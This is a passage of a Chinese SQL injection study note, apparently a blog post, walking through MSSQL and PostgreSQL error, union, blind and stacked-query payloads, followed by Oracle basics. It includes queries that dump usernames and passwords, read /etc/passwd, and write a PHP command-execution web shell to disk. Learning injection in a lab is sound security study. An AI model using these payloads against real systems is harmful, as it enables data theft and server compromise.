<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> AdminID <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> AdminID<span class="token punctuation">,</span>IsSystem <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>以此爆出所有字段</p>
<h2 id="2-6-报错注入">2.6 报错注入</h2>
<p>其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错</p>
<p>先来看隐式报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>user和0进行比较时就会报错</p>
<p>再来看显示报错，一般上显示报错用到的是<code>cast</code>和<code>convert</code>函数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">(</span><span class="token keyword">select</span> CAST<span class="token punctuation">(</span><span class="token keyword">USER</span> <span class="token keyword">as</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">convert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里再来引入一个<code>declare</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">declare</span> <span class="token variable">@a</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span> <span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'select convert(int,user)'</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token variable">@a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>declare</code>定义变量 <code>set</code>赋值<code>exec</code>执行</p>
<h2 id="2-7-联合查询注入">2.7 联合查询注入</h2>
<p>mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位，因为mssql数据库是个强类型的数据库，对数据格式比较严格。</p>
<p>（这里也是没搞懂发生隐式转换会如何，我猜测是转换后无法查询我们想让其查询的语句了）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>DB_NAME<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>你也可以这样来联合报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> CAST<span class="token punctuation">(</span>db_name<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="2-8-布尔盲注">2.8 布尔盲注</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>布尔盲注没有mysql那么多姿势，大同小异截取字符串比较</p>
<h2 id="2-9-时间盲注">2.9 时间盲注</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">select</span> IS_SRVROLEMEMBER<span class="token punctuation">(</span><span class="token string">'sysadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>waitfor delay '0:0:5'</code>是mssql的延时语法</p>
<p>同样可以用字符串截取来延时注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>0x03 PostgreSQL</h1>
<h2 id="3-1-环境搭建">3.1 环境搭建</h2>
<p>这里比较建议用docker搭建（如果不赶时间的话），我这里也是懒得搭建了，依旧是跟着文章走一遍</p>
<h2 id="3-2-验证注入">3.2 验证注入</h2>
<p>index.php?uid=1 AND 1=1 运行正常</p>
<p>index.php?uid=1 AND 1=2 运行异常</p>
<h2 id="3-3-报错注入">3.3 报错注入</h2>
<p>这里也没去查，猜测是cast函数将select查询出的数据转换为了as语句后面的numeric数字型，导致报错</p>
<p><strong>获取版本号：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tbuser <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">AND</span> <span class="token number">7778</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>::<span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015100908578.png" alt="image-20231015100908578"></p>
<p><strong>获取 Schemas 名称</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tbuser <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">AND</span> <span class="token number">7778</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> schemaname <span class="token keyword">FROM</span> pg_tables <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span>::<span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015100921512.png" alt="image-20231015100921512"></p>
<h2 id="3-4-时间盲注">3.4 时间盲注</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">AND</span> <span class="token number">6489</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">6489</span> <span class="token keyword">FROM</span> PG_SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//延时 5 秒</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101251875.png" alt="image-20231015101251875"></p>
<h2 id="3-5-堆叠注入">3.5  堆叠注入</h2>
<p>（多语句查询，stacked queries）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> PG_SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101324281.png" alt="image-20231015101324281"></p>
<h2 id="3-6-联合注入">3.6 联合注入</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 运行正常

?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> 运行异常，获取字段数 <span class="token number">3</span>

?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'11111'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment">-- 查看是否输出 11111</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里依旧是NULL而不用数字占用</p>
<p><img src="image-20231015101436309.png" alt="image-20231015101436309"></p>
<p><img src="image-20231015101455053.png" alt="image-20231015101455053"></p>
<p><img src="image-20231015101502110.png" alt="image-20231015101502110"></p>
<p>获取数据库结构和内容，此处均为联合查询</p>
<h4 id="获取模式名称（schemaname）名称">获取模式名称（schemaname）名称</h4>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">COALESCE</span><span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>schemaname <span class="token keyword">AS</span> <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> pg_tables<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>语法解析：</p>
<pre class="line-numbers language-none"><code class="language-none">COALESCE(expression[,n]) coalesce 函数返回参数（列名）中第一个非 NULL 值的字段值，注意不是为空''

cast ('1' as numeric) 1 转换为数字类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>简化：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>schemaname<span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> pg_tables<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101622775.png" alt="image-20231015101622775"></p>
<p>用户创建的数据库默认模式名称（schemaname）为 public</p>
<h3 id="获取数据表名称">获取数据表名称</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>tablename<span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> pg_tables <span class="token keyword">WHERE</span> schemaname <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101656967.png" alt="image-20231015101656967"></p>
<h3 id="获取表字段名称">获取表字段名称</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>attname<span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> pg_namespace<span class="token punctuation">,</span>pg_type<span class="token punctuation">,</span>pg_attribute b <span class="token keyword">JOIN</span> pg_class a <span class="token keyword">ON</span> a<span class="token punctuation">.</span>oid<span class="token operator">=</span>b<span class="token punctuation">.</span>attrelid <span class="token keyword">WHERE</span> a<span class="token punctuation">.</span>relnamespace<span class="token operator">=</span>pg_namespace<span class="token punctuation">.</span>oid <span class="token operator">AND</span> pg_type<span class="token punctuation">.</span>oid<span class="token operator">=</span>b<span class="token punctuation">.</span>atttypid <span class="token operator">AND</span> attnum<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token operator">AND</span> a<span class="token punctuation">.</span>relname<span class="token operator">=</span><span class="token string">'tbuser'</span> <span class="token operator">AND</span> nspname<span class="token operator">=</span><span class="token string">'public'</span>—<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101747879.png" alt="image-20231015101747879"></p>
<h3 id="获取表内容">获取表内容</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>id<span class="token operator">||</span><span class="token string">','</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">','</span><span class="token operator">||</span>passwd<span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> <span class="token keyword">public</span><span class="token punctuation">.</span>tbuser<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101838101.png" alt="image-20231015101838101"></p>
<p><strong>测列数：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span>
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>测显位：第 2，3</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'null'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> 错误
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> 正常
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token boolean">null</span> 正常
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'null'</span> 错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>获取信息：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span>
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token keyword">current_user</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span>
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>current_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>获取数据库名：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>string_agg<span class="token punctuation">(</span>datname<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> pg_database<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>获取表名：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>、<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>string_agg<span class="token punctuation">(</span>tablename<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> pg_tables <span class="token keyword">where</span> schemaname<span class="token operator">=</span><span class="token string">'public'</span>

<span class="token number">2</span>、<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>string_agg<span class="token punctuation">(</span>relname<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> pg_stat_user_tables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>获取列名：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>string_agg<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'reg_users'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>获取数据：</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span>string_agg<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token keyword">from</span> reg_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="3-7-文件或目录操作">3.7 文件或目录操作</h2>
<p>PostgreSQL 中部分内置函数、表</p>
<p><img src="image-20231015101911527.png" alt="image-20231015101911527"></p>
<h3 id="列目录——只能列安装目录下的文件">列目录——只能列安装目录下的文件</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>pg_ls_dir<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015101929944.png" alt="image-20231015101929944"></p>
<h3 id="读文件">读文件</h3>
<p>这里是堆叠注入，注意分号</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> passwd<span class="token punctuation">(</span>t <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY passwd <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>t<span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token keyword">FROM</span> passwd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将要查询的数据放进了新建的t表，并最终读取</p>
<p><img src="image-20231015102053878.png" alt="image-20231015102053878"></p>
<h3 id="写文件">写文件</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> pass<span class="token punctuation">;</span>（这里需要为数据库存在的表）<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> hacktb <span class="token punctuation">(</span>t <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> hacktb<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'&lt;?php @system("$_GET[cmd]");?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY hacktb<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">TO</span> <span class="token string">'/tmp/hack.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015102125008.png" alt="image-20231015102125008"></p>
<p><img src="image-20231015102132894.png" alt="image-20231015102132894"></p>
<h1>0x04 Oracle</h1>
<h2 id="4-1-基本概念">4.1 基本概念</h2>
<p>Oracle和MySQL数据库语法大致相同，结构不太相同。<strong>最大的一个特点就是oracle可以调用Java代码。</strong></p>
<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
<ol>
<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
<li>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
<li>UNDOTBS：用于事务回退等</li>
<li>TEMP：作为缓存空间减少内存负担</li>
<li>USERS：就是存储我们定义的表和数据</li>
</ol>
<p>​		在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是<code>select 1+1 from dual</code>。</p>
<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
<ol>
<li>sys：相当于 Linux 下的 root 用户。为 DBA 角色</li>
<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。</li>
<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
</ol>
<h2 id="4-2-基本语法">4.2 基本语法</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">column</span><span class="token punctuation">,</span> group_function<span class="token punctuation">(</span><span class="token keyword">column</span><span class="token punctuation">)</span>
<span class="token keyword">from</span> <span class="token keyword">table</span>
<span class="token punctuation">[</span><span class="token keyword">where</span> condition<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token keyword">group</span> <span class="token keyword">by</span> group_by_expression<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token keyword">having</span> group_condition<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token keyword">column</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Oracle要求select后必须指明要查询的表名，可以用dual。</p>
<p>Oracle使用 <code>||</code> 拼接字符串，MySQL中为或运算。</p>
<p><img src="image-20231015104356973.png" alt="image-20231015104356973"></p>
<p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如<code>sysdate</code>。</p>
<p>Oracle中limit应该使用虚表中的rownum字段通过where条件判断。</p>
<p><img src="image-20231015104406502.png" alt="image-20231015104406502"></p>
<p>Oracle中没有空字符，<code>''</code>和’null’都是null，而MySQL中认为<code>''</code>仍然是一个字符串。</p>
<p>Oracle对数据格式要求严格，比如<code>union select</code>的时候，放到下文讲。</p>
<p>Oracle的系统表：</p>
<pre class="line-numbers language-none"><code class="language-none">- dba_tables : 系统里所有的表的信息，需要DBA权限才能查询
- all_tables : 当前用户有权限的表的信息
- user_tables: 当前用户名下的表的信息
